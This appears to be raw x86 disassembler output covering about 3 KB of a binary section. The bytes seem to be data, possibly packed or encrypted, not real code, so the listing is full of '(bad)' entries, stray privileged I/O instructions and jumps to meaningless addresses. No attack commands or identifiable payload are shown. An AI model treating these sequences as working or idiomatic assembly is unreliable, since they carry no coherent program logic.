  4188ee:	sub    ch,BYTE PTR [ebx-0x764221f2]
  4188f4:	add    al,0x28
  4188f6:	sub    DWORD PTR [ebx],esi
  4188f8:	pusha  
  4188f9:	lock rol DWORD PTR [ecx+0x732b2f82],0xc2
  418901:	jmp    0x418959
  418903:	pop    ecx
  418904:	cmp    al,0xc1
  418906:	loope  0x4188ae
  418908:	imul   eax,DWORD PTR [ebx],0x19
  41890b:	hlt    
  41890c:	dec    edx
  41890d:	dec    esi
  41890e:	jge    0x41891f
  418910:	mov    al,0x7e
  418912:	sbb    DWORD PTR [ebx+0xb],0xeb36e83d
  418919:	jle    0x41894c
  41891b:	or     al,0x3a
  41891d:	sbb    edi,DWORD PTR ds:[eax+esi*4-0x429d975]
  418925:	push   ebx
  418926:	shl    dh,0x21
  418929:	mov    ah,dl
  41892b:	adc    al,0xc4
  41892d:	mov    bl,0xaf
  41892f:	jo     0x4188ce
  418931:	mov    bl,0x6a
  418933:	pop    edx
  418934:	push   esp
  418935:	(bad)  
  418936:	mov    ds:0x3ec561fd,eax
  41893b:	loopne 0x4188d9
  41893d:	mov    cl,0xf6
  41893f:	fidivr WORD PTR [esi-0x539ed3dd]
  418945:	jno    0x4189a6
  418947:	fwait
  418948:	mov    dl,0x3b
  41894a:	js     0x4188f2
  41894c:	add    ebp,DWORD PTR ds:0x60ce46e1
  418952:	or     eax,0x593fadcb
  418957:	jb     0x4188e9
  418959:	dec    esi
  41895a:	adc    DWORD PTR [eax],ebp
  41895c:	daa    
  41895d:	icebp  
  41895e:	push   ss
  41895f:	push   eax
  418960:	mov    ecx,0xbbccff6a
  418965:	pop    es
  418966:	mov    BYTE PTR ds:0x9e2b1489,cl
  41896c:	pop    esp
  41896d:	in     eax,0x5a
  41896f:	(bad)  
  418970:	mov    cs,WORD PTR [ebp-0x495306d3]
  418976:	retf   
  418977:	lds    ecx,FWORD PTR [ebp+0x392b1d46]
  41897d:	std    
  41897e:	mov    eax,ds:0x60ea3e5d
  418983:	adc    dl,cl
  418985:	scas   al,BYTE PTR es:[edi]
  418986:	xchg   edi,eax
  418987:	das    
  418988:	fstp   TBYTE PTR [eax+0x63]
  41898b:	leave  
  41898c:	xor    al,0xae
  41898e:	dec    esp
  41898f:	push   ss
  418990:	mov    ch,0xdd
  418992:	push   ebx
  418993:	sub    ebx,DWORD PTR [edi-0x53]
  418996:	mov    ds:0xfa34989c,al
  41899b:	pop    es
  41899c:	aas    
  41899d:	out    dx,eax
  41899e:	dec    ebx
  41899f:	adc    al,0x84
  4189a1:	or     bl,al
  4189a3:	(bad)  [eax+0x4b]
  4189a6:	jno    0x418942
  4189a8:	mov    esi,0x894c2982
  4189ad:	pusha  
  4189ae:	ds scas eax,DWORD PTR es:[edi]
  4189b0:	(bad)  
  4189b1:	out    0x9,al
  4189b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189b4:	cmp    ch,BYTE PTR [ecx+0x5459154f]
  4189ba:	in     al,dx
  4189bb:	mov    edi,0x39a53dd4
  4189c0:	daa    
	...
  418a31:	add    BYTE PTR [eax],al
  418a33:	add    BYTE PTR [edi],ch
  418a35:	stos   DWORD PTR es:[edi],eax
  418a36:	cdq    
  418a37:	inc    ecx
  418a38:	popf   
  418a39:	jae    0x418a3a
  418a3b:	out    dx,eax
  418a3c:	inc    esp
  418a3d:	dec    edi
  418a3e:	(bad)  
  418a3f:	clc    
  418a40:	adc    DWORD PTR [edi],esi
  418a42:	push   eax
  418a43:	repnz aam 0xb
  418a46:	add    DWORD PTR [eax],eax
  418a48:	cmc    
  418a49:	add    BYTE PTR [eax],al
  418a4b:	add    BYTE PTR [edx+ebp*2+0xe126ca9],bh
  418a52:	jp     0x418a21
  418a54:	xor    edx,DWORD PTR [edi+edi*1-0x360cbc5b]
  418a5b:	push   edi
  418a5c:	xor    DWORD PTR [edx+0x50016e7f],ebx
  418a62:	mov    bh,0x6e
  418a64:	loope  0x418a88
  418a66:	sub    DWORD PTR [eax+edx*4-0x5d],0x501e5263
  418a6e:	bound  edx,QWORD PTR [eax-0x36]
  418a71:	(bad)  
  418a73:	aas    
  418a74:	outs   dx,DWORD PTR ds:[esi]
  418a75:	cdq    
  418a76:	push   esp
  418a77:	jecxz  0x418abc
  418a79:	out    0x17,al
  418a7b:	jge    0x418ab8
  418a7d:	clc    
  418a7e:	inc    edx
  418a7f:	test   DWORD PTR [edi-0x6],edx
  418a82:	mov    eax,0xb9c42c
  418a87:	pop    ss
  418a88:	jle    0x418ac3
  418a8a:	and    esp,edx
  418a8c:	cmc    
  418a8d:	inc    edi
  418a8e:	xchg   ecx,eax
  418a8f:	cwde   
  418a90:	inc    ebx
  418a91:	iret   
  418a92:	lds    esp,FWORD PTR ds:0x511f801f
  418a98:	in     al,dx
  418a99:	in     eax,0x25
  418a9b:	test   BYTE PTR [eax+0xf],ah
  418a9e:	pop    es
  418a9f:	outs   dx,DWORD PTR ds:[esi]
  418aa0:	rcr    ch,1
  418aa2:	xchg   ebx,eax
  418aa3:	fcomp  QWORD PTR [ebp-0x4d95b75a]
  418aa9:	jne    0x418aaf
  418aab:	mov    dl,0xb9
  418aad:	stos   DWORD PTR es:[edi],eax
  418aae:	in     al,dx
  418aaf:	xor    DWORD PTR es:[ecx],esp
  418ab2:	pop    ds
  418ab3:	sbb    bh,0x32
  418ab6:	xchg   esp,eax
  418ab7:	js     0x418a86
  418ab9:	dec    esi
  418aba:	cmp    DWORD PTR [ebp+0x62ad4e95],eax
  418ac0:	outs   dx,BYTE PTR ds:[esi]
  418ac1:	sar    esi,1
  418ac3:	outs   dx,DWORD PTR ds:[esi]
  418ac4:	xor    edx,DWORD PTR [ecx]
  418ac6:	cld    
  418ac7:	pop    edi
  418ac8:	add    ch,ch
  418aca:	fld    TBYTE PTR [edi-0x70d52bf7]
  418ad0:	dec    DWORD PTR [ecx-0x6f3ed7c0]
  418ad6:	add    eax,0x52ee36c7
  418adb:	in     al,0x6a
  418add:	scas   al,BYTE PTR es:[edi]
  418ade:	pop    ebp
  418adf:	lods   eax,DWORD PTR ds:[esi]
  418ae0:	push   0x47
  418ae2:	ss xchg ebp,eax
  418ae4:	sbb    al,0xc4
  418ae6:	scas   eax,DWORD PTR es:[edi]
  418ae7:	or     DWORD PTR [edi],esi
  418ae9:	push   0xffffff86
  418aeb:	ss inc esp
  418aed:	pushf  
  418aee:	cmp    esp,ebx
  418af0:	add    al,0xe2
  418af2:	or     esi,DWORD PTR [edi+0x308e51f9]
  418af8:	cdq    
  418af9:	adc    ch,BYTE PTR [ecx]
  418afb:	out    dx,al
  418afc:	cld    
  418afd:	and    edi,DWORD PTR [edi+0x7c]
  418b00:	jmp    0x3e55df70
  418b05:	test   al,0x4e
  418b07:	pushf  
  418b08:	and    bl,ah
  418b0a:	push   eax
  418b0b:	scas   al,BYTE PTR es:[edi]
  418b0c:	jecxz  0x418aaf
  418b0e:	in     al,0xcc
  418b10:	aam    0xa8
  418b12:	dec    edx
  418b13:	push   ecx
  418b14:	pop    esp
  418b15:	ins    BYTE PTR es:[edi],dx
  418b16:	aaa    
  418b17:	(bad)
  418b1b:	fidivr WORD PTR [eax-0x55]
  418b1e:	xor    eax,0xf3f86b98
  418b23:	dec    esi
  418b24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b25:	sbb    eax,0xfcfad9c2
  418b2a:	cmp    edx,DWORD PTR ss:[ebx]
  418b2d:	iret   
  418b2e:	sbb    al,0xb8
  418b30:	out    dx,eax
  418b31:	pop    ebp
  418b32:	mov    ebp,0xbd676de0
  418b37:	popf   
  418b38:	xor    DWORD PTR [eax+0x265924b9],ebp
  418b3e:	bound  esp,QWORD PTR [eax]
  418b40:	push   0x0
	...
  418bb2:	add    BYTE PTR [eax],al
  418bb4:	mov    eax,eax
  418bb6:	nop
  418bb7:	test   cl,bl
  418bb9:	aam    0x9d
  418bbb:	int    0x19
  418bbd:	xchg   edx,eax
  418bbe:	clc    
  418bbf:	pop    DWORD PTR [esi-0x3626e44e]
  418bc5:	or     al,0x1
  418bc7:	add    ch,dh
  418bc9:	add    BYTE PTR [eax],al
  418bcb:	add    BYTE PTR [ecx+esi*1-0x41631ffa],bh
  418bd2:	int    0x8a
  418bd4:	(bad)  
  418bd5:	retf   0xcfe0
  418bd8:	call   0x1e7f514c
  418bdd:	les    eax,FWORD PTR [edx-0x7992fab7]
  418be3:	push   esi
  418be4:	dec    esi
  418be5:	sub    al,BYTE PTR [ecx+eiz*4-0x7d384f80]
  418bec:	mov    al,0xce
  418bee:	int3   
  418bef:	sub    ah,BYTE PTR [ecx-0x3]
  418bf2:	mov    bh,0x5e
  418bf4:	pop    esp
  418bf5:	add    DWORD PTR [esp+ebx*8],edx
  418bf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bf9:	or     al,0x43
  418bfb:	adc    ch,al
  418bfd:	or     ebx,DWORD PTR [esi+0x5d]
  418c00:	shr    DWORD PTR [eax+0x3f],0x9
  418c04:	cmp    BYTE PTR [edi],dh
  418c06:	(bad)  [ecx]
  418c08:	adc    eax,DWORD PTR [ebp+0x1d]
  418c0b:	jmp    0x418c40
  418c0d:	jnp    0x418b93
  418c0f:	push   0x43160bec
  418c14:	or     al,0x61
  418c16:	sbb    dh,ah
  418c18:	out    dx,eax
  418c19:	mov    dl,0x5e
  418c1b:	pop    eax
  418c1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c1d:	or     edx,DWORD PTR [esi-0x27]
  418c20:	mov    dh,0xd7
  418c22:	(bad)  
  418c23:	jns    0x418bc8
  418c25:	mov    ah,0xf5
  418c27:	scas   al,BYTE PTR es:[edi]
  418c28:	sub    ebp,DWORD PTR [esi+ebx*1-0x1]
  418c2c:	jl     0x418c52
  418c2e:	retf   0xbcc9
  418c31:	pop    eax
  418c32:	clc    
  418c33:	popf   
  418c34:	fcomp  DWORD PTR [ebx-0x40e29e32]
  418c3a:	jns    0x418c7f
  418c3c:	cmp    al,0x3
  418c3e:	and    al,0x78
  418c40:	pop    esp
  418c41:	adc    al,BYTE PTR [esi*4+0x7c67618e]
  418c48:	js     0x418c72
  418c4a:	or     al,0x5b
  418c4c:	sbb    dl,BYTE PTR [ecx-0xc3829ed]
  418c52:	cdq    
  418c53:	jle    0x418c98
  418c55:	cli    
  418c56:	push   eax
  418c57:	aaa    
  418c58:	test   eax,0x11c7dc95
  418c5d:	or     eax,0x49f86c71
  418c62:	(bad)  
  418c64:	call   0xd930fa5b
  418c69:	mov    bh,0x7d
  418c6b:	xor    DWORD PTR [edx],ebx
  418c6d:	std    
  418c6e:	add    eax,DWORD PTR [ebx-0x1f]
  418c71:	mov    dh,0x5b
  418c73:	mov    esi,DWORD PTR [ecx+eiz*4-0x7d]
  418c77:	sbb    ebx,DWORD PTR [ebp-0x80]
  418c7a:	ret    0xe7b5
  418c7d:	or     edx,esi
  418c7f:	mov    fs,esi
  418c81:	or     DWORD PTR [edx],esi
  418c83:	retf   0x98b6
  418c86:	xchg   edi,eax
  418c87:	dec    edi
  418c88:	ret    0xf52c
  418c8b:	dec    esi
  418c8c:	(bad)  
  418c8d:	icebp  
  418c8e:	sbb    bh,cl
  418c90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c91:	fisttp QWORD PTR [ebx]
  418c93:	jecxz  0x418c4c
  418c95:	push   0x44
  418c97:	dec    ebx
  418c98:	mov    ah,0x3f
  418c9a:	fs into 
  418c9c:	out    dx,al
  418c9d:	out    0xa7,eax
  418c9f:	jl     0x418cfe
  418ca1:	mov    esi,edi
  418ca3:	xor    edx,edi
  418ca5:	sbb    DWORD PTR [ecx-0x60d5c400],0xffffffb0
  418cac:	and    esp,0x37
  418caf:	adc    DWORD PTR [edx],esp
  418cb1:	bnd jle 0x418d02
  418cb4:	sar    ebx,1
  418cb6:	out    dx,al
  418cb7:	sub    DWORD PTR [edx-0x77],edi
  418cba:	mov    es,WORD PTR [esi+eiz*8]
  418cbd:	xor    BYTE PTR [esi],bl
  418cbf:	call   0x0:0x80
	...
  418d32:	add    BYTE PTR [eax],al
  418d34:	pop    ss
  418d35:	arpl   WORD PTR ds:0x5f7f7d53,bx
  418d3b:	addr16 in eax,dx
  418d3d:	inc    eax
  418d3e:	jmp    0x5ab97761
  418d43:	mov    al,0xbe
  418d45:	or     eax,0xf50001
  418d4a:	add    BYTE PTR [eax],al
  418d4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d4d:	lock call 0xb29a16f5
  418d53:	ret    
  418d54:	and    DWORD PTR [ebp-0x9],ecx
  418d57:	pop    esi
  418d58:	add    al,0x6e
  418d5a:	push   ebp
  418d5b:	pop    ss
  418d5c:	retf   
  418d5d:	aas    
  418d5e:	test   al,0xc3
  418d60:	jne    0x418d28
  418d62:	inc    eax
  418d63:	pop    esp
  418d64:	in     eax,0xb4
  418d66:	(bad)  
  418d67:	and    BYTE PTR ds:0x54867be6,cl
  418d6d:	push   0xbe85b7ff
  418d72:	cwde   
  418d73:	adc    cl,BYTE PTR [ebp-0x48]
  418d76:	jecxz  0x418d25
  418d78:	pop    ebp
  418d79:	dec    esp
  418d7a:	add    ebp,DWORD PTR [esi-0x3e]
  418d7d:	mov    BYTE PTR [ebp+ecx*8-0xd],al
  418d81:	push   cs
  418d82:	fild   QWORD PTR [esi]
  418d84:	mov    bh,0x60
  418d86:	cmp    al,0xdd
  418d88:	cmp    al,0x1f
  418d8a:	pop    edx
  418d8b:	out    0x4,al
  418d8d:	cmp    DWORD PTR [edx-0x4d],ebp
  418d90:	lods   al,BYTE PTR ds:[esi]
  418d91:	add    eax,0x6376c616
  418d96:	push   edi
  418d97:	dec    ebx
  418d98:	mov    ch,0xea
  418d9a:	jne    0x418da2
  418d9c:	(bad)  
  418d9d:	call   0xd0acbb5f
  418da2:	pop    esp
  418da3:	mov    bh,0xbd
  418da5:	add    eax,0x8bb75898
  418daa:	jnp    0x418e2a
  418dac:	dec    esi
  418dad:	or     cl,0x1f
  418db0:	jns    0x418e27
  418db2:	or     cl,BYTE PTR [edi]
  418db4:	iret   
  418db5:	ins    BYTE PTR es:[edi],dx
  418db6:	pop    esi
  418db7:	out    dx,al
  418db8:	sbb    BYTE PTR [ebx],dl
  418dba:	jecxz  0x418df3
  418dbc:	dec    edi
  418dbd:	mov    ecx,0xf523d01d
  418dc2:	sbb    DWORD PTR [edx],esi
  418dc4:	dec    ecx
  418dc5:	ret    
  418dc6:	pop    eax
  418dc7:	shr    BYTE PTR [ecx+0x28add55e],1
  418dcd:	mov    ebp,0xe61fbb29
  418dd2:	dec    ebp
  418dd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dd4:	cmp    ebp,edi
  418dd6:	add    eax,0x8a3e963e
  418ddb:	ficomp WORD PTR [ecx]
  418ddd:	adc    eax,0xe563568b
  418de2:	repnz xor ah,BYTE PTR ds:0xb18f40db
  418de9:	and    DWORD PTR [edi],0x7
  418dec:	push   es
  418ded:	rol    BYTE PTR [eax-0x36],cl
  418df0:	popf   
  418df1:	ret    
  418df2:	out    dx,eax
  418df3:	inc    edx
  418df4:	xchg   ebp,eax
  418df5:	inc    ebp
  418df6:	(bad)  
  418df7:	in     al,0x6a
  418df9:	xchg   ebp,eax
  418dfa:	test   eax,0xf53508d4
  418dff:	pop    edx
  418e00:	xor    BYTE PTR [ebx-0x74],bh
  418e03:	mov    cl,0x3d
  418e05:	and    edi,DWORD PTR [eax+0x10]
  418e08:	sbb    DWORD PTR [eax],esi
  418e0a:	js     0x418dd6
  418e0c:	rcr    DWORD PTR [edx-0x3158c5d4],1
  418e12:	loope  0x418dbe
  418e14:	pop    es
  418e15:	dec    edx
  418e16:	bound  esi,QWORD PTR [edx-0x6715bf96]
  418e1c:	jae    0x418e71
  418e1e:	(bad)  
  418e1f:	sub    BYTE PTR [esi],dl
  418e21:	xor    DWORD PTR [ebp-0x7be4c9d3],edi
  418e27:	jmp    0xbd558b0e
  418e2c:	push   ebx
  418e2d:	mov    al,0x1
  418e2f:	cmc    
  418e30:	mov    ah,0x0
  418e32:	fwait
  418e33:	dec    edx
  418e34:	mov    eax,0x86d2d3e7
  418e39:	rol    BYTE PTR [eax],0x2b
  418e3c:	shr    BYTE PTR [ecx],0xf3
  418e3f:	sahf   
  418e40:	sahf   
	...
  418eb1:	add    BYTE PTR [eax],al
  418eb3:	add    BYTE PTR [edx-0x1a],ah
  418eb6:	out    0x3b,al
  418eb8:	out    0x3b,al
  418eba:	(bad)  
  418ebb:	push   DWORD PTR [eax-0x20]
  418ebe:	jecxz  0x418eb9
  418ec0:	fdivr  DWORD PTR [ebx+0x10eb332]
  418ec7:	add    ch,dh
  418ec9:	add    BYTE PTR [eax],al
  418ecb:	add    BYTE PTR [ecx+0x375c75e8],cl
  418ed1:	inc    ebp
  418ed2:	es fs stos BYTE PTR es:[edi],al
  418ed5:	out    dx,al
  418ed6:	jmp    0x6603:0xb4df981e
  418edd:	mov    bh,0xc2
  418edf:	mov    edx,0xd6ede5d5
  418ee4:	out    0x3c,eax
  418ee6:	fwait
  418ee7:	sbb    cl,bl
  418ee9:	adc    BYTE PTR [edx-0x248ec496],0x26
  418ef0:	mov    ss,edi
  418ef2:	iret   
  418ef3:	inc    ebp
  418ef4:	in     al,dx
  418ef5:	sub    DWORD PTR ds:0x87c98a4,0x3
  418efc:	inc    edi
  418efd:	jns    0x418f41
  418eff:	dec    eax
  418f00:	jmp    0x7f92d387
  418f05:	js     0x418f36
  418f07:	test   BYTE PTR [esi+0x2e],al
  418f0a:	jo     0x418f4a
  418f0c:	(bad)  
  418f0d:	jmp    0x3d730ab1
  418f12:	pushf  
  418f13:	adc    esp,DWORD PTR [eax-0x48599e11]
  418f19:	or     BYTE PTR [esi-0x76b854fb],0x1e
  418f20:	in     al,dx
  418f21:	pop    eax
  418f22:	add    BYTE PTR [edx-0x409f0268],dl
  418f28:	mov    edx,0x1a9668a8
  418f2d:	push   edi
  418f2e:	retf   0xafbc
  418f31:	ins    BYTE PTR es:[edi],dx
  418f32:	inc    edx
  418f33:	xchg   edx,eax
  418f34:	in     al,0xb2
  418f36:	(bad)  [ebp+eiz*4+0x28]
  418f3a:	push   eax
  418f3b:	cmc    
  418f3c:	sbb    DWORD PTR [eax-0x6f],0x38f877e1
  418f43:	daa    
  418f44:	retf   0x6de8
  418f47:	out    dx,eax
  418f48:	mov    DWORD PTR [eax],ebx
  418f4a:	(bad)  
  418f4b:	out    0xf1,eax
  418f4d:	push   cs
  418f4e:	add    edi,esi
  418f50:	push   eax
  418f51:	mov    dh,0xfd
  418f53:	pop    esp
  418f54:	push   esp
  418f55:	(bad)  
  418f57:	xchg   ebp,eax
  418f58:	add    eax,0x713dde89
  418f5d:	les    edx,FWORD PTR [edx-0x6e]
  418f60:	jle    0x418f6f
  418f62:	or     bh,BYTE PTR [ecx+0x3c]
  418f65:	and    al,0x6d
  418f67:	mov    al,0x9d
  418f69:	push   esp
  418f6a:	jb     0x418fab
  418f6c:	dec    edx
  418f6d:	add    ch,BYTE PTR [ebx-0x1]
  418f70:	jnp    0x418f8e
  418f72:	and    ch,BYTE PTR [esi]
  418f74:	push   ds
  418f75:	jo     0x418ff4
  418f77:	jno    0x418fa2
  418f79:	pop    eax
  418f7a:	jge    0x418f4d
  418f7c:	pushf  
  418f7d:	sbb    bh,bl
  418f7f:	outs   dx,BYTE PTR ds:[esi]
  418f80:	(bad)  
  418f81:	outs   dx,BYTE PTR ds:[esi]
  418f82:	scas   eax,DWORD PTR es:[edi]
  418f83:	sub    al,0xd0
  418f85:	xchg   esi,eax
  418f86:	sub    al,0x7d
  418f88:	or     dh,ah
  418f8a:	push   ds
  418f8b:	ja     0x418f76
  418f8d:	mov    DWORD PTR [eax-0x44],esi
  418f90:	iret   
  418f91:	mov    esp,0x8228eb1f
  418f96:	jl     0x418f9b
  418f98:	je     0x418ff0
  418f9a:	sbb    eax,0x7543340e
  418f9f:	jae    0x418fa9
  418fa1:	into   
  418fa2:	mov    edi,esp
  418fa4:	adc    eax,0x96a13257
  418fa9:	mov    cs,ebp
  418fab:	cmp    al,0x5a
  418fad:	inc    ebx
  418fae:	add    al,BYTE PTR ds:0x397982f1
  418fb4:	hlt    
  418fb5:	mov    BYTE PTR [ebx-0x3aca2307],cl
  418fbb:	xchg   BYTE PTR [eax-0x67e2884c],dl
	...
  419031:	add    BYTE PTR [eax],al
  419033:	add    BYTE PTR [ecx-0xba9482],ch
  419039:	push   ebp
  41903a:	scas   eax,DWORD PTR es:[edi]
  41903b:	(bad)  
  41903c:	out    dx,eax
  41903d:	mov    ch,0xb6
  41903f:	shl    BYTE PTR [eax],cl
  419041:	fild   DWORD PTR [ecx]
  419043:	mov    eax,0x10fa8
  419048:	cmc    
  419049:	add    BYTE PTR [eax],al
  41904b:	add    BYTE PTR [eax+0x3d55811e],al
  419051:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419052:	popa   
  419053:	xchg   esi,eax
  419054:	xor    DWORD PTR [eax+ecx*1+0x3f],0xa96ca97f
  41905c:	sbb    BYTE PTR [edi+0x2312466a],al
  419062:	popf   
  419063:	(bad)  
  419064:	pop    ss
  419065:	xor    ebx,ebx
  419067:	inc    ebp
  419068:	mov    dh,0xc0
  41906a:	gs std 
  41906c:	les    esi,FWORD PTR [edi-0x27]
  41906f:	mov    cl,0xdc
  419071:	rol    BYTE PTR [ecx+ebx*2+0x6f],1
  419075:	add    ecx,ebp
  419077:	inc    ecx
  419078:	cmp    ecx,DWORD PTR [eax]
  41907a:	and    BYTE PTR [edx-0x5af5aa2d],dh
  419080:	mov    eax,ds:0x796f90bf
  419085:	add    BYTE PTR [eax],bh
  419087:	cmp    BYTE PTR [eax+eiz*4],cl
  41908a:	hlt    
  41908b:	mov    BYTE PTR [ebx-0x24704a15],ah
  419091:	stc    
  419092:	addr16 and ecx,esi
  419095:	dec    esi
  419096:	jle    0x4190b7
  419098:	aaa    
  419099:	loope  0x4190c0
  41909b:	add    ecx,DWORD PTR ds:0xdcef65af
  4190a1:	dec    ebx
  4190a2:	ja     0x41902a
  4190a4:	pop    esp
  4190a5:	mov    esp,0x56157501
  4190aa:	inc    ebp
  4190ab:	mov    dh,0xf6
  4190ad:	mov    cl,0xc6
  4190af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190b0:	inc    edi
  4190b1:	adc    eax,0x98f17b64
  4190b6:	or     eax,0xc8ce693f
  4190bb:	test   al,0x69
  4190bd:	and    DWORD PTR [esi],ebx
  4190bf:	sub    edi,DWORD PTR [edi-0x2ad80af2]
  4190c5:	lods   al,BYTE PTR ds:[esi]
  4190c6:	mov    ah,0xf
  4190c8:	pop    ebp
  4190c9:	jno    0x41905a
  4190cb:	cmp    eax,eax
  4190cd:	ficom  WORD PTR [ebp+0x7c]
  4190d0:	jp     0x4190a7
  4190d2:	mov    ch,0x11
  4190d4:	fild   QWORD PTR [ebx+0x4b]
  4190d7:	sub    esi,ebx
  4190d9:	mov    esi,?
  4190db:	xchg   ebp,eax
  4190dc:	add    al,0xba
  4190de:	in     al,0x78
  4190e0:	cli    
  4190e1:	jno    0x41906b
  4190e3:	sbb    dl,bh
  4190e5:	mov    ebx,?
  4190e7:	jbe    0x41915f
  4190e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190ea:	jo     0x41907c
  4190ec:	cmp    esp,DWORD PTR [edx-0x73]
  4190ef:	mov    BYTE PTR [eax],cl
  4190f1:	xchg   ebx,eax
  4190f2:	lock mov cl,0x4f
  4190f5:	pushf  
  4190f6:	(bad)
  4190fa:	add    dl,BYTE PTR [ebx-0x2df8900d]
  419100:	rol    bl,cl
  419102:	pop    ebx
  419103:	pusha  
  419104:	cmp    DWORD PTR [ebx],ecx
  419106:	shl    DWORD PTR gs:0x20d54844,1
  41910d:	call   0x5ac0ae41
  419112:	mov    WORD PTR [ecx],ss
  419114:	adc    eax,eax
  419116:	fcmovnu st,st(1)
  419118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419119:	ins    DWORD PTR es:[edi],dx
  41911a:	fld    DWORD PTR es:[ecx]
  41911d:	mov    eax,ds:0x588be820
  419122:	jg     0x41919e
  419124:	mov    dh,0xf6
  419126:	jne    0x419127
  419128:	jae    0x41910b
  41912a:	xchg   esp,eax
  41912b:	push   ss
  41912c:	fisub  WORD PTR ds:0x3f00794d
  419132:	cmp    al,bl
  419134:	jge    0x4190d4
  419136:	cli    
  419137:	test   ecx,esp
  419139:	fldcw  WORD PTR [esi+0x5a]
  41913c:	rcr    DWORD PTR [edi+esi*1+0x41],1
  419140:	jne    0x419142
	...
  4191b2:	add    BYTE PTR [eax],al
  4191b4:	aaa    
  4191b5:	xchg   edx,eax
  4191b6:	and    al,0x83
  4191b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191b9:	mov    bh,0xb7
  4191bb:	mov    dh,0xb3
  4191bd:	cmp    al,0x9b
  4191bf:	scas   eax,DWORD PTR es:[edi]
  4191c0:	das    
  4191c1:	mov    bl,0x3b
  4191c3:	mov    BYTE PTR [ebp-0xafffef0],bl
  4191c9:	add    BYTE PTR [eax],al
  4191cb:	add    BYTE PTR [edx-0x33d93df7],al
  4191d1:	jg     0x419249
  4191d3:	xor    DWORD PTR [esi],ebp
  4191d5:	push   ebx
  4191d6:	jo     0x4191d0
  4191d8:	push   ds
  4191d9:	les    ecx,FWORD PTR [eax]
  4191db:	lea    esp,[ebx*1+0x7efd22a2]
  4191e2:	jecxz  0x41919d
  4191e4:	mov    edx,0x4a1da4c5
  4191e9:	call   0x4eb7:0xdf08e38d
  4191f0:	xchg   ebp,eax
  4191f1:	fisttp QWORD PTR [ecx-0x53cb5213]
  4191f7:	jecxz  0x419272
  4191f9:	scas   al,BYTE PTR es:[edi]
  4191fa:	jge    0x419269
  4191fc:	push   ebp
  4191fd:	loop   0x419201
  4191ff:	cmp    al,0xf9
  419201:	fiadd  DWORD PTR [esi+0x1bfd118f]
  419207:	jle    0x419206
  419209:	in     eax,0xbf
  41920b:	pop    edi
  41920c:	outs   dx,BYTE PTR ds:[esi]
  41920d:	sub    BYTE PTR [edi],dh
  41920f:	loope  0x419277
  419211:	sahf   
  419212:	loope  0x419269
  419214:	xchg   edi,eax
  419215:	adc    dh,ah
  419217:	lea    edi,[edi*2-0x6ef0227c]
  41921e:	push   edx
  41921f:	aas    
  419220:	mov    bl,0x8b
  419222:	dec    edi
  419223:	add    cl,ah
  419225:	or     DWORD PTR [eax],edx
  419227:	in     al,0xa1
  419229:	mov    edx,0xf7b1d4d7
  41922e:	pop    esp
  41922f:	or     al,0x9a
  419231:	in     eax,dx
  419232:	pop    ebx
  419233:	out    0x7e,eax
  419235:	cmp    BYTE PTR [edx-0x56],bl
  419238:	hlt    
  419239:	xor    al,0xf2
  41923b:	jmp    0x4192a4
  41923d:	jmp    0x58c6:0xac90dc7b
  419244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419245:	je     0x4191db
  419247:	xchg   esi,ebx
  419249:	fisubr WORD PTR [eax+0x1a]
  41924c:	push   ds
  41924d:	inc    ebx
  41924e:	mov    edi,ebp
  419250:	mov    ?,WORD PTR [esi]
  419252:	jp     0x419251
  419254:	xchg   esi,eax
  419255:	mov    ebp,0xc6f3118d
  41925a:	test   al,0xec
  41925c:	add    eax,0x405154d0
  419261:	inc    edi
  419262:	popa   
  419263:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419264:	(bad)  [edi]
  419266:	pop    edx
  419267:	mov    dl,0xbf
  419269:	scas   al,BYTE PTR es:[edi]
  41926a:	mov    dl,BYTE PTR [eax]
  41926c:	fistp  WORD PTR [ebx-0x4d]
  41926f:	inc    edi
  419270:	adc    DWORD PTR [edx-0x67],edx
  419273:	nop
  419274:	jp     0x41926e
  419276:	or     al,BYTE PTR [edx-0x89e6377]
  41927c:	aaa    
  41927d:	or     eax,0x5050163
  419282:	sbb    BYTE PTR [edi],0x3b
  419285:	lods   eax,DWORD PTR ds:[esi]
  419286:	rcl    bh,0xdf
  419289:	ror    DWORD PTR [eax+0x5c5caa7b],0xa5
  419290:	mov    ds:0x6158b639,eax
  419295:	pushf  
  419296:	inc    esi
  419297:	int    0x82
  419299:	ror    DWORD PTR [edx],1
  41929b:	inc    esp
  41929c:	and    DWORD PTR [eax+0x64],eax
  41929f:	test   DWORD PTR [esi+0x5bcd37a0],esi
  4192a5:	mov    bl,0xd9
  4192a7:	sbb    ch,BYTE PTR [ebp-0x54]
  4192aa:	push   ds
  4192ab:	jecxz  0x419253
  4192ad:	xchg   ebx,eax
  4192ae:	paddd  mm5,QWORD PTR [esi]
  4192b1:	sub    al,0xe9
  4192b3:	xchg   ebx,eax
  4192b4:	std    
  4192b5:	and    eax,ebx
  4192b7:	lock pop es
  4192b9:	jne    0x419295
  4192bb:	sbb    ebp,edi
  4192bd:	out    dx,al
  4192be:	stc    
  4192bf:	stos   BYTE PTR es:[edi],al
  4192c0:	scas   eax,DWORD PTR es:[edi]
	...
  419331:	add    BYTE PTR [eax],al
  419333:	add    ah,bl
  419335:	mov    bl,0x3f
  419337:	push   eax
  419338:	jg     0x419316
  41933a:	(bad)  
  41933b:	mov    edi,0xbcd03e15
  419340:	sbb    al,0xd6
  419342:	lods   eax,DWORD PTR ds:[esi]
  419343:	push   ebp
  419344:	xchg   edx,eax
  419345:	adc    DWORD PTR [ecx],eax
  419347:	add    ch,dh
  419349:	add    BYTE PTR [eax],al
  41934b:	add    BYTE PTR [ebx],bh
  41934d:	mov    cl,0x3b
  41934f:	inc    esi
  419350:	test   edi,esp
  419352:	sbb    al,0x8e
